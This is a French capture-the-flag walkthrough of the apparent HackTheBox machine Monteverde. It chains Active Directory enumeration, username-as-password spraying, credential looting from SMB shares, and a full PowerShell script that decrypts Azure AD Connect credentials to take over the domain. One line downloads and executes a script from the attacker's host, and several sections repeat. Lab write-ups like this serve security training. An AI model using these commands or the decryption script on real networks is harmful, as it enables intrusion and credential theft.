![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

L'objectif de cette phase est d'identifier la surface d'attaque d'une machine Windows typique d'un environnement **Active Directory** et d'obtenir un premier point d'appui via une faiblesse de politique de mots de passe.

### Énumération des Services (Scanning)

Je commence par un scan **Nmap** complet pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.172

# Scan détaillé des services identifiés
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.172
```

L'analyse des résultats révèle un **Domain Controller** (ports 88/Kerberos, 389/LDAP, 53/DNS). Le nom de domaine est identifié comme `MEGABANK.LOCAL`. Le port 5985 (**WinRM**) est également ouvert, ce qui suggère un vecteur potentiel pour un shell distant si des identifiants sont compromis.

### Énumération RPC & Extraction d'Utilisateurs

Les tentatives d'énumération **SMB** anonymes via `smbclient` ou `smbmap` ne donnent aucun résultat probant (accès refusé). Cependant, le service **MSRPC** (port 135/445) autorise une **Null Session**, me permettant d'interroger la base **SAM** via `rpcclient`.

```bash
# Connexion RPC anonyme
rpcclient -U "" -N 10.10.10.172

# Extraction de la liste des utilisateurs
rpcclient $> querydispinfo
```

Je récupère une liste d'utilisateurs critiques pour la suite :
*   `AAD_987d7f2f57d2` (lié à Azure AD Connect)
*   `SABatchJobs`
*   `mhope`
*   `smorgan`
*   `dgalanos`
*   `roleary`

### Vecteur d'Entrée : Password Spraying

Avec une liste d'utilisateurs valides, je teste une vulnérabilité courante : l'utilisation du nom d'utilisateur comme mot de passe (**Username as Password**). C'est une forme de **Password Spraying** qui évite le verrouillage de compte si l'on ne teste qu'une seule itération par utilisateur.

> **Schéma Mental :**
> Liste d'utilisateurs (RPC) -> Test de mot de passe faible (User=Pass) -> Validation via SMB -> Accès aux partages.

```bash
# Test de Password Spraying avec CrackMapExec
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
```

Le scan confirme une correspondance positive : `MEGABANK.LOCAL\SABatchJobs:SABatchJobs`.

### Exploitation SMB & Découverte de Secrets

En utilisant les identifiants de `SABatchJobs`, je ré-énumère les partages **SMB**. Le partage `users$` s'avère lisible.

```bash
# Lister les partages avec les credentials obtenus
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs

# Exploration récursive du partage users$
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
```

Je découvre un fichier nommé `azure.xml` dans le répertoire personnel de l'utilisateur `mhope` (`\mhope\azure.xml`).

```bash
# Téléchargement du fichier via smbclient
smbclient -U SABatchJobs //10.10.10.172/users$ -c 'get mhope/azure.xml azure.xml'
```

Le contenu du fichier révèle un mot de passe en clair au sein d'un objet `PSADPasswordCredential` : `4n0therD4y@n0th3r$`.

### Accès Initial via WinRM

Le fichier ayant été trouvé dans le dossier de `mhope`, il est logique de tester ce mot de passe pour cet utilisateur. Je vérifie l'accès via le service **WinRM**.

```bash
# Validation des credentials pour WinRM
crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

Le résultat affiche `(Pwn3d!)`, indiquant que `mhope` fait partie du groupe **Remote Management Users**. Je peux maintenant obtenir un shell interactif.

```bash
# Connexion via Evil-WinRM
evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

Je suis désormais connecté en tant que `mhope` et je peux récupérer le flag `user.txt`.

---

### Énumération Interne & Mouvement Latéral

Après avoir identifié une liste de comptes via **RPC**, je procède à une phase de **Password Spraying**. Sur des environnements Windows mal durcis, il est fréquent que des comptes de service ou des utilisateurs initiaux possèdent un mot de passe identique à leur **Username**.

```bash
# Password spraying avec CrackMapExec pour tester Username == Password
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
```

Le compte **SABatchJobs** valide cette condition. J'utilise ces identifiants pour énumérer les partages **SMB** accessibles.

```bash
# Énumération des partages avec les credentials de SABatchJobs
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
# Exploration récursive du partage users$
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
```

> **Schéma Mental :** L'attaque repose ici sur une mauvaise hygiène des mots de passe (comptes de service) suivie d'une énumération de fichiers de configuration sensibles (Looting) stockés sur des partages réseau mal segmentés.

Dans le répertoire de l'utilisateur `mhope`, je découvre un fichier `azure.xml`. Ce fichier contient un mot de passe en clair : `4n0therD4y@n0th3r$`.

### Pivot vers l'utilisateur mhope

Je vérifie si ces informations permettent un accès via **WinRM** (port 5985), ce qui confirmerait la possibilité d'un mouvement latéral.

```bash
# Validation des credentials pour WinRM
crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
# Connexion via Evil-WinRM
evil-winrm.rb -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

### Escalade de Privilèges : Abus d'Azure AD Connect

Une fois authentifié en tant que `mhope`, l'énumération des groupes révèle l'appartenance à **Azure Admins**. La machine héberge **Microsoft Azure AD Sync**, un service qui synchronise l'**Active Directory** local avec **Azure**.

> **Schéma Mental :** Azure AD Connect utilise une base de données **SQL LocalDB** (`ADSync`) pour stocker les configurations. Un compte spécifique possède les clés de chiffrement pour les credentials de réplication. Si un utilisateur peut interroger cette base et charger les DLL de synchronisation, il peut extraire le mot de passe du compte de synchronisation (souvent un **Domain Admin**).

Je déploie un script PowerShell qui exploite les API de `mcrypt.dll` (présente dans le répertoire d'installation d'Azure AD Sync) pour déchiffrer les credentials stockés dans la base **ADSync**.

```powershell
# Script d'extraction des credentials ADSync (simplifié)
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# Chargement de la DLL de chiffrement propriétaire
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
# ... (chargement des clés et entropie via la DB)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```

L'exécution de cette logique permet de récupérer le mot de passe du compte **Administrator** de la forêt, car celui-ci a été utilisé pour configurer l'agent de synchronisation au lieu d'un compte **MSOL** dédié.

```bash
# Exécution du script via IEX
*Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

### Accès Root

Avec le mot de passe de l'**Administrator**, je finalise l'attaque en prenant le contrôle total du **Domain Controller** via **WinRM**.

```bash
# Accès final en tant qu'administrateur du domaine
evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
```

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

#### Énumération des privilèges Azure AD
Une fois en possession d'un shell en tant que **mhope**, l'analyse des groupes d'utilisateurs révèle une appartenance au groupe **Azure Admins**. Cette information, couplée à la présence de répertoires spécifiques dans `C:\Program Files`, confirme que la machine fait office de passerelle **Azure Active Directory Connect**.

```powershell
# Vérification des groupes de l'utilisateur
net user mhope
# Résultat : Global Group memberships *Azure Admins *Domain Users

# Identification des composants Azure AD Sync
ls "C:\Program Files\*Azure*"
```

#### Vecteur d'attaque : Déchiffrement de la base ADSync
Le service **Azure AD Connect** utilise une base de données locale (**ADSync**) pour stocker les configurations de réplication, y compris les identifiants du compte de service chargé de la synchronisation avec Azure. Dans une configuration par défaut, ce compte est souvent nommé `MSOL_`, mais ici, il s'avère être le compte **administrator** du domaine.

La vulnérabilité réside dans le fait qu'un membre du groupe **Azure Admins** possède les droits de lecture sur la base de données SQL locale et peut charger les bibliothèques natives pour déchiffrer les secrets stockés.

> **Schéma Mental :**
> 1. **Extraction des Clés :** Récupérer le `keyset_id`, l' `instance_id` et l' `entropy` depuis la table `mms_server_configuration`.
> 2. **Récupération du Blob :** Extraire le XML de configuration et le mot de passe chiffré (Base64) depuis la table `mms_management_agent`.
> 3. **Déchiffrement Local :** Utiliser la DLL légitime `mcrypt.dll` fournie par Microsoft pour instancier un **KeyManager** et déchiffrer le mot de passe en utilisant les clés extraites à l'étape 1.

#### Exploitation (Déchiffrement des Credentials)
J'utilise un script PowerShell personnalisé qui automatise la connexion à l'instance **LocalDB** et le processus de déchiffrement via l'API .NET de **Microsoft Azure AD Sync**.

```powershell
# Script de déchiffrement (Get-MSOLCredentials.ps1)
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()

# 1. Extraction des métadonnées de chiffrement
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

# 2. Extraction du mot de passe chiffré
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# 3. Déchiffrement via mcrypt.dll
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

# Affichage des résultats
Write-Host "Domain: MEGABANK.LOCAL"
Write-Host "Username: administrator"
Write-Host "Password: $decrypted"
```

Exécution du script via un **IEX (Invoke-Expression)** :
```powershell
*Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

#### Compromission Totale
Le mot de passe récupéré permet une connexion directe via **WinRM** avec les privilèges les plus élevés.

```bash
# Accès final en tant qu'Administrateur
evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
```

---

#### Analyse Post-Exploitation "Beyond Root"

L'analyse de ce vecteur révèle une nuance critique concernant les versions de **Azure AD Sync**. 

1. **Évolution de la Sécurité :** Sur les versions récentes, Microsoft a durci l'accès aux clés de chiffrement. Désormais, seul le compte de service **ADSync** (ou un utilisateur ayant des privilèges **SYSTEM**) peut déchiffrer la configuration. Dans ce scénario (Monteverde), la configuration était plus permissive, permettant à un **Azure Admin** d'effectuer l'opération.

2. **Analyse du POC v2 (xp_cmdshell) :** Il existe une version plus moderne de l'exploit qui tente d'utiliser `xp_cmdshell` pour exécuter le PowerShell de déchiffrement directement sous l'identité du service SQL (qui est souvent le compte **ADSync**). 
   - Sur Monteverde, cette méthode échoue car l'utilisateur **mhope** n'a pas les droits `SUPERUSER` sur l'instance SQL pour activer `xp_cmdshell` via `sp_configure`.
   - La réussite de la première méthode prouve que l'instance était vulnérable à une lecture directe par un utilisateur du groupe **Azure Admins**, sans nécessiter d'élévation de privilèges SQL préalable.

3. **Persistence & Domination :** Le compte compromis étant le **Domain Administrator**, la domination est totale. L'attaquant peut désormais extraire la base **NTDS.dit** ou modifier les **Service Principal Names (SPN)** pour établir une persistence à long terme dans l'infrastructure hybride (On-premise / Azure).